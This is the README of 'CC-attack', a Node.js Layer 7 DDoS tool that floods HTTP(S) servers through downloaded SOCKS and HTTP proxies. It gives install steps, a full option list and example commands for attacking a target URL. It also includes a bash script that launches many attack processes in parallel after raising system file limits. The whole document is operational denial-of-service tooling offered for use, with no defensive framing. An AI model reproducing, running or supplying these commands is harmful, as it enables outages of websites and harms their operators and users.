       /////    /////    /////////////
      CCCCC/   CCCCC/   | CC-attack |/
     CC/      CC/       |-----------|/
     CC/      CC/       |  Layer 7  |/
     CC/////  CC/////   | ddos tool |/
      CCCCC/   CCCCC/   |___________|/

# CC-attack ![](https://img.shields.io/badge/Version-3.7.1-brightgreen.svg) ![](https://img.shields.io/badge/license-GPLv2-blue.svg)
 A script for using socks4/5 or http proxies to attack http(s) server.

## Translations
![](https://img.shields.io/badge/Version-Node-brightgreen.svg)
![](https://img.shields.io/badge/Version-Python-lightblue.svg)

 News:
- [x] Added Support of HTTP proxies
- [x] Added More proxies api to download

 Info:
- [x] Using nodeJS
- [x] Added more human-like options
- [x] Http Get/Head/Post/Slow Flood
- [x] Random Http Header/Data
- [x] Socks4/5 Proxies Downloader
- [x] Socks4/5 Proxies Checker
- [x] Customize Cookies
- [x] Customize Post Data
- [x] Support HTTPS
- [x] Support Socks4/5

## Showcase
Using multiproc.sh with socks4 on a vps
![](https://i.imgur.com/KLJIZs8.png)

## Install

    git clone https://github.com/Leeon123/CC-attack.git
    npm i
    cd CC-attack-js

## Usage

    node cc.js <arguments>

```
===============  CC-attack help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:800)
   -f        | set proxies file (default:proxy.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set attack time(default:60)
   -down     | download proxies
   -check    | check proxies
=====================================================
```
### Some example of the usage
Download socks5 proxies as proxy.txt:
```
node cc.js -down -f proxy.txt -v 5
```
Attack a target with custom proxies list(socks4.txt) for 30 seconds :
```
node cc.js -url http://target.com -f socks4.txt -v 4 -s 30
```

## Usage of multiproc.sh
```
This script is using for increasing the performance of cc.js.
Due to the suck performance of python since it has a GIL lock,
And the main repo owner was lazy to make a multiprocess version.
I'm lazy too and wont make it with node, even though Node has multiprocess.
There is a option for linux user to increase their performance of cc.js

This script basicly just run cc.js multiple times to make it "multi-processing"

First, put this script and cc.js in the same folder.

Then prepare the proxies list by yourself or just run "node cc.js -down -v 4" (-v socks version)

After that, change the number of process.

At last, change atk_cmd to your command and run the script by "bash multiproc.sh"
```
Example setup of multiproc.sh (-v socks version) (-s attack time)
```
# Command to run your Node.js script
atk_cmd="node cc.js -url http://target.com -v 4 -s 60"

# Number of processes you want
process=10

# Change the system limit
ulimit -n 999999

echo Attack started
for ((i=1; i<=$process; i++))
do
  $atk_cmd >/dev/null &
  sleep 0.1
done
```
